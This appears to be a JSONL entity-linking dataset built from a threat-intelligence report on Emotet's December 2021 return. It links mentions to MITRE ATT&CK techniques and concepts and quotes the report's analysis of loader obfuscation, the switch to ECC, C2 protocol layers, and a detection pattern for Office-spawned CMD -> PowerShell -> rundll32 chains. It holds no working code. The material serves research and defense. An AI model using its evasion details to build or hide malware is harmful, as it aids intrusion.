{"mention": "Microsoft Word or Excel sheets that spawn", "context_left": "``` Defenders should look for", "context_right": "`CMD -> PowerShell -> rundll32[.]exe` to identify Emotet activity. **What we learned**", "_context_left": "Defenders should look for ", "_context_right": " `CMD -> PowerShell -> rundll32[.]exe` to identify Emotet activity.", "sentence_left": "```", "sentence_right": "**What we learned**", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "rundll32[.]exe", "context_left": "``` Defenders should look for Microsoft Word or Excel sheets that spawn `CMD -> PowerShell ->", "context_right": "` to identify Emotet activity. **What we learned**", "_context_left": "Defenders should look for Microsoft Word or Excel sheets that spawn `CMD -> PowerShell -> ", "_context_right": "` to identify Emotet activity.", "sentence_left": "```", "sentence_right": "**What we learned**", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "**What we learned** Many parts of the bot are identical to the version of", "context_right": "that was active prior to the takedown, particularly the dynamic-link library (DLL). Emotet depends on `rundll32[.]exe` to execute, using the exported function “Control\\\\_RunDLL” as the main starting function.", "_context_left": "Many parts of the bot are identical to the version of ", "_context_right": " that was active prior to the takedown, particularly the dynamic-link library (DLL).", "sentence_left": "**What we learned**", "sentence_right": "Emotet depends on `rundll32[.]exe` to execute, using the exported function “Control\\\\_RunDLL” as the main starting function.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "Many parts of the bot are identical to the version of Emotet that was active prior to the takedown, particularly the dynamic-link library (DLL).", "context_right": "depends on `rundll32[.]exe` to execute, using the exported function “Control\\\\_RunDLL” as the main starting function. While the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021.", "_context_left": "", "_context_right": " depends on `rundll32[.]exe` to execute, using the exported function “Control\\\\_RunDLL” as the main starting function.", "sentence_left": "Many parts of the bot are identical to the version of Emotet that was active prior to the takedown, particularly the dynamic-link library (DLL).", "sentence_right": "While the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet depends on `rundll32[.]exe` to execute", "context_left": "Many parts of the bot are identical to the version of Emotet that was active prior to the takedown, particularly the dynamic-link library (DLL).", "context_right": ", using the exported function “Control\\\\_RunDLL” as the main starting function. While the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021.", "_context_left": "", "_context_right": ", using the exported function “Control\\\\_RunDLL” as the main starting function.", "sentence_left": "Many parts of the bot are identical to the version of Emotet that was active prior to the takedown, particularly the dynamic-link library (DLL).", "sentence_right": "While the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021.", "label": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "label_id": 385, "label_title": "Signed Binary Proxy Execution", "label_link": "https://attack.mitre.org/techniques/T1218", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "Emotet depends on `rundll32[.]exe` to execute, using the exported function “Control\\\\_RunDLL” as the main starting function. While the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key", "context_right": "algorithms indicate the loader is based on code dated from December 2020 to January 2021. Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past.", "_context_left": "While the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key ", "_context_right": " algorithms indicate the loader is based on code dated from December 2020 to January 2021.", "sentence_left": "Emotet depends on `rundll32[.]exe` to execute, using the exported function “Control\\\\_RunDLL” as the main starting function.", "sentence_right": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "code flattening/state machine obfuscator", "context_left": "Emotet depends on `rundll32[.]exe` to execute, using the exported function “Control\\\\_RunDLL” as the main starting function. While the loader uses a fairly intensive", "context_right": ", YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021. Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past.", "_context_left": "While the loader uses a fairly intensive ", "_context_right": ", YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021.", "sentence_left": "Emotet depends on `rundll32[.]exe` to execute, using the exported function “Control\\\\_RunDLL” as the main starting function.", "sentence_right": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past.", "label": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016) Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)", "label_id": 544, "label_title": "Obfuscated Files or Information", "label_link": "https://attack.mitre.org/techniques/T1027", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "While the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021. Despite previous versions of code being recycled, there are differences in the loader that set it apart from", "context_right": "’s past. The old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption.", "_context_left": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from ", "_context_right": "’s past.", "sentence_left": "While the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021.", "sentence_right": "The old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past. The old", "context_right": "used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption. This public key also is used during communication validation by hashing the data to check that it has not been modified.", "_context_left": "The old ", "_context_right": " used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption.", "sentence_left": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past.", "sentence_right": "This public key also is used during communication validation by hashing the data to check that it has not been modified.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "RSA", "context_left": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past. The old Emotet used an onboard public Rivest-Shamir-Adleman (", "context_right": ") key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption. This public key also is used during communication validation by hashing the data to check that it has not been modified.", "_context_left": "The old Emotet used an onboard public Rivest-Shamir-Adleman (", "_context_right": ") key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption.", "sentence_left": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past.", "sentence_right": "This public key also is used during communication validation by hashing the data to check that it has not been modified.", "label": "RSA (Rivest–Shamir–Adleman) is one of the first public-key cryptosystems and is widely used for secure data transmission. In such a cryptosystem, the encryption key is public and it is different from the decryption key which is kept secret (private). In RSA, this asymmetry is based on the practical difficulty of the factorization of the product of two large prime numbers, the \"factoring problem\". The acronym RSA is made of the initial letters of the surnames of Ron Rivest, Adi Shamir, and Leonard Adleman, who first publicly described the algorithm in 1977. Clifford Cocks, an English mathematician working for the British intelligence agency Government Communications Headquarters (GCHQ), had developed an equivalent system in 1973, but this was not declassified until 1997.  A user of RSA creates and then publishes a public key based on two large prime numbers, along with an auxiliary value. The prime numbers must be kept secret. Anyone can use the public key to encrypt a message, but with currently published methods, and if the public key is large enough, only someone with knowledge of the prime numbers can decode the message feasibly. Breaking RSA encryption is known as the RSA problem. Whether it is as difficult as the factoring problem remains an open question.  RSA is a relatively slow algorithm, and because of this, it is less commonly used to directly encrypt user data. More often, RSA passes encrypted shared keys for symmetric key cryptography which in turn can perform bulk encryption-decryption operations at much higher speed.", "label_id": 12592, "label_title": "RSA (cryptosystem)", "label_link": "https://en.wikipedia.org/wiki?curid=25385", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "AES", "context_left": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past. The old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (", "context_right": ") key used to encrypt all network traffic, as is typical for asymmetric encryption. This public key also is used during communication validation by hashing the data to check that it has not been modified.", "_context_left": "The old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (", "_context_right": ") key used to encrypt all network traffic, as is typical for asymmetric encryption.", "sentence_left": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past.", "sentence_right": "This public key also is used during communication validation by hashing the data to check that it has not been modified.", "label": "RSA (Rivest–Shamir–Adleman) is one of the first public-key cryptosystems and is widely used for secure data transmission. In such a cryptosystem, the encryption key is public and it is different from the decryption key which is kept secret (private). In RSA, this asymmetry is based on the practical difficulty of the factorization of the product of two large prime numbers, the \"factoring problem\". The acronym RSA is made of the initial letters of the surnames of Ron Rivest, Adi Shamir, and Leonard Adleman, who first publicly described the algorithm in 1977. Clifford Cocks, an English mathematician working for the British intelligence agency Government Communications Headquarters (GCHQ), had developed an equivalent system in 1973, but this was not declassified until 1997.  A user of RSA creates and then publishes a public key based on two large prime numbers, along with an auxiliary value. The prime numbers must be kept secret. Anyone can use the public key to encrypt a message, but with currently published methods, and if the public key is large enough, only someone with knowledge of the prime numbers can decode the message feasibly. Breaking RSA encryption is known as the RSA problem. Whether it is as difficult as the factoring problem remains an open question.  RSA is a relatively slow algorithm, and because of this, it is less commonly used to directly encrypt user data. More often, RSA passes encrypted shared keys for symmetric key cryptography which in turn can perform bulk encryption-decryption operations at much higher speed.", "label_id": 12592, "label_title": "RSA (cryptosystem)", "label_link": "https://en.wikipedia.org/wiki?curid=25385", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "standard (AES) key used to encrypt all network traffic", "context_left": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past. The old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption", "context_right": ", as is typical for asymmetric encryption. This public key also is used during communication validation by hashing the data to check that it has not been modified.", "_context_left": "The old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption ", "_context_right": ", as is typical for asymmetric encryption.", "sentence_left": "Despite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet’s past.", "sentence_right": "This public key also is used during communication validation by hashing the data to check that it has not been modified.", "label": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "label_id": 376, "label_title": "Encrypted Channel", "label_link": "https://attack.mitre.org/techniques/T1573", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "public key also is used during communication validation", "context_left": "The old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption. This", "context_right": "by hashing the data to check that it has not been modified. The new Emotet uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation.", "_context_left": "This ", "_context_right": " by hashing the data to check that it has not been modified.", "sentence_left": "The old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption.", "sentence_right": "The new Emotet uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation.", "label": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "label_id": 376, "label_title": "Encrypted Channel", "label_link": "https://attack.mitre.org/techniques/T1573", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "This public key also is used during communication validation by hashing the data to check that it has not been modified. The new", "context_right": "uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation. These encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.", "_context_left": "The new ", "_context_right": " uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation.", "sentence_left": "This public key also is used during communication validation by hashing the data to check that it has not been modified.", "sentence_right": "These encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "ECC", "context_left": "This public key also is used during communication validation by hashing the data to check that it has not been modified. The new Emotet uses Elliptic Curve Cryptography (", "context_right": ") for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation. These encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.", "_context_left": "The new Emotet uses Elliptic Curve Cryptography (", "_context_right": ") for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation.", "sentence_left": "This public key also is used during communication validation by hashing the data to check that it has not been modified.", "sentence_right": "These encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.", "label": "Elliptic-curve cryptography (ECC) is an approach to public-key cryptography based on the algebraic structure of elliptic curves over finite fields. ECC requires smaller keys compared to non-EC cryptography (based on plain Galois fields) to provide equivalent security.  Elliptic curves are applicable for key agreement, digital signatures, pseudo-random generators and other tasks. Indirectly, they can be used for encryption by combining the key agreement with a symmetric encryption scheme. They are also used in several integer factorization algorithms based on elliptic curves that have applications in cryptography, such as Lenstra elliptic-curve factorization.", "label_id": 4680, "label_title": "Elliptic-curve cryptography", "label_link": "https://en.wikipedia.org/wiki?curid=9966", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Elliptic Curve Cryptography (ECC) for asymmetric encryption,", "context_left": "This public key also is used during communication validation by hashing the data to check that it has not been modified. The new Emotet uses", "context_right": "leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation. These encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.", "_context_left": "The new Emotet uses ", "_context_right": " leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation.", "sentence_left": "This public key also is used during communication validation by hashing the data to check that it has not been modified.", "sentence_right": "These encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.", "label": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "label_id": 376, "label_title": "Encrypted Channel", "label_link": "https://attack.mitre.org/techniques/T1573", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation", "context_left": "This public key also is used during communication validation by hashing the data to check that it has not been modified. The new Emotet uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard", "context_right": ". These encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.", "_context_left": "The new Emotet uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard ", "_context_right": ".", "sentence_left": "This public key also is used during communication validation by hashing the data to check that it has not been modified.", "sentence_right": "These encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.", "label": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "label_id": 376, "label_title": "Encrypted Channel", "label_link": "https://attack.mitre.org/techniques/T1573", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "The new Emotet uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation. These encryption keys are used to identify the", "context_right": "botnets researchers are calling Epoch4 and Epoch5. **Protocol changes**", "_context_left": "These encryption keys are used to identify the ", "_context_right": " botnets researchers are calling Epoch4 and Epoch5.", "sentence_left": "The new Emotet uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation.", "sentence_right": "**Protocol changes**", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "**Protocol changes** In addition to the changes to", "context_right": "’s cryptography, the communication protocol also saw some changes to each of the three “layers” necessary for communication. Layer 1 (L1) contains the plaintext data sent to the command and control (C2).", "_context_left": "In addition to the changes to ", "_context_right": "’s cryptography, the communication protocol also saw some changes to each of the three “layers” necessary for communication.", "sentence_left": "**Protocol changes**", "sentence_right": "Layer 1 (L1) contains the plaintext data sent to the command and control (C2).", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "command and control", "context_left": "In addition to the changes to Emotet’s cryptography, the communication protocol also saw some changes to each of the three “layers” necessary for communication. Layer 1 (L1) contains the plaintext data sent to the", "context_right": "(C2). Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.", "_context_left": "Layer 1 (L1) contains the plaintext data sent to the ", "_context_right": " (C2).", "sentence_left": "In addition to the changes to Emotet’s cryptography, the communication protocol also saw some changes to each of the three “layers” necessary for communication.", "sentence_right": "Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "C2", "context_left": "In addition to the changes to Emotet’s cryptography, the communication protocol also saw some changes to each of the three “layers” necessary for communication. Layer 1 (L1) contains the plaintext data sent to the command and control (", "context_right": "). Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.", "_context_left": "Layer 1 (L1) contains the plaintext data sent to the command and control (", "_context_right": ").", "sentence_left": "In addition to the changes to Emotet’s cryptography, the communication protocol also saw some changes to each of the three “layers” necessary for communication.", "sentence_right": "Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CE", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "contains the plaintext data sent to the command and control (C2", "context_left": "In addition to the changes to Emotet’s cryptography, the communication protocol also saw some changes to each of the three “layers” necessary for communication. Layer 1 (L1)", "context_right": "). Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.", "_context_left": "Layer 1 (L1) ", "_context_right": ").", "sentence_left": "In addition to the changes to Emotet’s cryptography, the communication protocol also saw some changes to each of the three “layers” necessary for communication.", "sentence_right": "Layer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CI", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.", "context_left": "Layer 1 (L1) contains the plaintext data sent to the command and control (C2). Layer 2 (L2)", "context_right": "Layer 3 (L3) is the encrypted data and contains the encrypted AES key, the encrypted data and some randomly generated data as padding.", "_context_left": "Layer 2 (L2) ", "_context_right": "", "sentence_left": "Layer 1 (L1) contains the plaintext data sent to the command and control (C2).", "sentence_right": "Layer 3 (L3) is the encrypted data and contains the encrypted AES key, the encrypted data and some randomly generated data as padding.", "label": "The adversary is trying to communicate with compromised systems to control them. Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.", "label_id": 581, "label_title": "Command and Control", "label_link": "https://attack.mitre.org/tactics/TA0011", "entity_class": "CI", "entity_type": "TACTIC", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
